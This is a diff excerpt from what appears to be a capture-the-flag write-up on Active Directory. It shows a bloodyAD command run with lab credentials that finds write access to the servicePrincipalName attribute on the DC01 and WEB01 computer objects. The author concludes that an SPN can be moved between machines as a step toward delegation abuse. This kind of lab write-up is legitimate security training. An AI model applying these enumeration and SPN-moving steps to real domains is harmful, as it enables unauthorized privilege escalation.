@@ -649,5 +649,17 @@ GFSNAPOT$    Computer     Resource-Based Constrained          WEB01$            
 
 Im only interested in the delegation rights of `a.white_adm`
 
+In this case its on `web01`
 
+```python
+bloodyAD --host dc01.pirate.htb -d pirate.htb -u 'a.white_adm' -p 'Password123!' get writable --detail
+
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
+servicePrincipalName: WRITE
+
+distinguishedName: CN=WEB01,CN=Computers,DC=pirate,DC=htb
+servicePrincipalName: WRITE
+```
+
+This means i can essentially move the SPN from one machine to the other, 
 
